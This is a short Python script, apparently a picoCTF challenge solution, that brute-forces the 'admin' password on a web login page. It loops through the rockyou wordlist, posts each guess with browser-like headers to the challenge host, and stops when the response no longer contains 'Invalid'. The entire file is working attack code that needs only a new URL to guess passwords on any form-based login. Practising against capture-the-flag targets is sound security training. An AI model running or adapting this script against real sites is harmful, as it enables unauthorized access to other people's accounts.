import requests

headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    # 'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://foggy-cliff.picoctf.net:64077',
    'Connection': 'keep-alive',
    'Referer': 'http://foggy-cliff.picoctf.net:64077/login',
    'Upgrade-Insecure-Requests': '1',
    'Priority': 'u=0, i',
}

words = [ x.strip() for x in open('/usr/share/wordlists/rockyou.txt',  encoding='latin-1') if x ]

for word in words: 
    data = {
        'username': 'admin',
        'password': word,
        'action': '',
    }
    print(f"Trying: {word}")
    response = requests.post('http://foggy-cliff.picoctf.net:64077/login', headers=headers, data=data)
    if "Invalid" not in response.text:
        break
